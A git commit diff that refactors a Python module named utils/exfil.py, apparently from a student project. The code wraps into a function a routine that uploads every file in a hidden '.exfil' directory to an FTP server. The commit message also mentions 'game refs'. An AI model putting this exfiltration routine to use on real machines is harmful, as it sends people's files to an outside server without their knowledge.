eaab2dc03d1611a2b6de089eb657d4e6d97639aa
Jack_PC <jfleming48@my.bcit.ca>
2025-06-01 16:53:14 -0700

    added main guard to exfil and game refs

--- utils/exfil.py
+++ utils/exfil.py
@@ -2,17 +2,19 @@ from .ftp_connect import connect_ftp
 import ftplib
 import os
 
-ftp = connect_ftp()
-ftp.set_debuglevel(2)
+def ftp_send():
+    ftp = connect_ftp()
+    ftp.set_debuglevel(2)
 
-exfil_dir = "C:/Users/jgwfl/OneDrive/Desktop/test_dir/.exfil"
+    exfil_dir = "C:/Users/jgwfl/OneDrive/Desktop/test_dir/.exfil"
 
-print(ftp.sock)
+    print(ftp.sock)
 
-#  scan dir for object
-for obj in os.scandir(exfil_dir):
-    with open(obj.path, "rb") as f:
-        ftp.storbinary(f"STOR {obj.name}", f)
-        print(f"Uploaded {obj.name}")
+    #  scan dir for object
+    for obj in os.scandir(exfil_dir):
+        with open(obj.path, "rb") as f:
+            ftp.storbinary(f"STOR {obj.name}", f)
+            print(f"Uploaded {obj.name}")
 
-# ftp.quit()
+if __name__ == "__main__":
+    ftp_send()
